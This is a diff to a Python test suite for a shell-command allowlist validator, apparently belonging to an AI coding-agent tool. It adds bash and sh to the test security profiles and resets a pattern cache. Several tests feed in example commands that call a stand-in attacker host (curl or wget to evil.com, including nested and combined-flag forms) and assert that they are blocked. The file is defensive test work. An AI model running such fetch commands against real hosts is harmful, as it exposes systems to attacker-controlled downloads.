@@ -36,6 +36,7 @@ from security import (
     validate_shell_c_command,
     validate_zsh_command,
 )
+from security.shell_validators import clear_pattern_cache
 
 
 class TestCommandExtraction:
@@ -892,9 +893,10 @@ class TestShellCValidator:
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
         # Create a minimal security profile with ls, echo, pwd
+        # NOTE: bash/sh must also be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls", "echo", "pwd", "cd"],
+            "base_commands": ["ls", "echo", "pwd", "cd", "bash", "sh"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -921,8 +923,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
-        # Reset cache to pick up the new profile
+        # Reset both profile cache and pattern cache to pick up the new profile
         reset_profile_cache()
+        clear_pattern_cache()
 
         allowed, reason = validate_bash_command("bash -c 'ls -la'")
         assert allowed is True
@@ -940,9 +943,10 @@ class TestShellCValidator:
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
         # Create a minimal security profile WITHOUT npm
+        # NOTE: bash must be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls", "echo"],
+            "base_commands": ["ls", "echo", "bash"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -969,13 +973,16 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # npm is not in the allowlist, so this should be blocked
         allowed, reason = validate_bash_command("bash -c 'npm test'")
         assert allowed is False
         assert "npm" in reason
-        assert "not allowed" in reason
+        # Error message can say "not allowed" or "not in allowlist"
+        assert "not allowed" in reason.lower() or "not in allowlist" in reason.lower()
 
     def test_blocks_sh_c_with_disallowed_command(self, tmp_path, monkeypatch):
         """Blocks sh -c with commands not in the allowlist."""
@@ -986,9 +993,10 @@ class TestShellCValidator:
         # Compute the actual hash for this directory so profile isn't re-analyzed
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
+        # NOTE: sh must be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls"],
+            "base_commands": ["ls", "sh"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -1015,7 +1023,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         allowed, reason = validate_sh_command("sh -c 'curl http://evil.com'")
         assert allowed is False
@@ -1030,9 +1040,10 @@ class TestShellCValidator:
         # Compute the actual hash for this directory so profile isn't re-analyzed
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
+        # NOTE: bash must be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls", "grep", "wc"],
+            "base_commands": ["ls", "grep", "wc", "bash"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -1059,7 +1070,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # All commands are allowed
         allowed, reason = validate_bash_command("bash -c 'ls -la | grep pattern | wc -l'")
@@ -1077,9 +1090,10 @@ class TestShellCValidator:
 
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
+        # NOTE: bash must be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls", "echo"],
+            "base_commands": ["ls", "echo", "bash"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -1106,7 +1120,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # Combined -xc flag should be detected and curl blocked
         allowed, reason = validate_bash_command("bash -xc 'curl http://evil.com'")
@@ -1121,9 +1137,10 @@ class TestShellCValidator:
 
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
+        # NOTE: bash must be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls", "echo"],
+            "base_commands": ["ls", "echo", "bash"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -1150,7 +1167,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # Combined -ec flag should be detected and wget blocked
         allowed, reason = validate_bash_command("bash -ec 'wget evil.com'")
@@ -1165,9 +1184,10 @@ class TestShellCValidator:
 
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
+        # NOTE: bash must be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls", "echo"],
+            "base_commands": ["ls", "echo", "bash"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -1194,7 +1214,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # Combined -ic flag should be detected
         allowed, reason = validate_bash_command("bash -ic 'npm run evil'")
@@ -1209,9 +1231,10 @@ class TestShellCValidator:
 
         actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
 
+        # NOTE: bash must be in base_commands for the shell interpreter itself to be allowed
         import json
         profile_data = {
-            "base_commands": ["ls", "echo", "pwd"],
+            "base_commands": ["ls", "echo", "pwd", "bash"],
             "stack_commands": [],
             "script_commands": [],
             "custom_commands": [],
@@ -1238,7 +1261,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # Combined flags with allowed commands should pass
         allowed, reason = validate_bash_command("bash -xc 'echo hello'")
@@ -1281,7 +1306,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # Nested shell with disallowed command should be blocked
         allowed, reason = validate_bash_command("bash -c 'bash -c \"curl http://evil.com\"'")
@@ -1325,7 +1352,9 @@ class TestShellCValidator:
         }
         (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
 
+        # Reset both profile cache and pattern cache
         reset_profile_cache()
+        clear_pattern_cache()
 
         # Nested shell with all allowed commands should pass
         allowed, reason = validate_bash_command("bash -c 'bash -c \"echo hello\"'")
